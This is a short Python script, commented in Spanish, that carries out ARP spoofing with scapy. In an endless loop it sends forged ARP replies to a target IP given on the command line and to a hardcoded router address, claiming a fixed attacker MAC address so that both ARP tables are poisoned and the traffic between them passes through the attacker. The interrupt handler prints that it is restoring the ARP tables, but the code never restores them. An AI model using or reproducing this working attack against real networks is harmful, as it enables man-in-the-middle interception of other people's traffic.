#!/usr/bin/env python3
#Ip_portatil= 192.168.68.117
#Ip_router=192.168.68.1 --> mac_router= 6c:5a:b0:c9:9e:90
#mi_mac= 50-E0-85-AA-31-D3
 

import scapy.all as scapy
import argparse
import signal
import sys
from termcolor import colored

def signal_handler(signal,frame):
    print(colored("\nDeteniendo ARP spoofing y reestableciendo tablas ARP\n","red"))
    sys.exit(1)
    
signal.signal(signal.SIGINT,signal_handler)

def get_arguments():
    parser = argparse.ArgumentParser("ARP spoofing")
    parser.add_argument("-t", "--target", dest="target",required=True,help="Host / IP a atacar")
    options = parser.parse_args()
    return options.target

def spoof(ip_adress,spoof_ip):

    packet = scapy.ARP(op=2,psrc=spoof_ip, pdst=ip_adress, hwsrc="50:E0:85:AA:31:D3")#op=2 para que sea una respuesta no una peticion y psrc=ip de la victima y pdst=ip del router
    scapy.send(packet,verbose=False)

def main():
 ip_adress = get_arguments()
 while True:
     spoof(ip_adress,"192.168.68.1")#aqui se envenena la tabla arp de la victima
     spoof("192.168.68.1",ip_adress)#aqui se envenena la tabla arp del router

if __name__ == "__main__":
  main()
  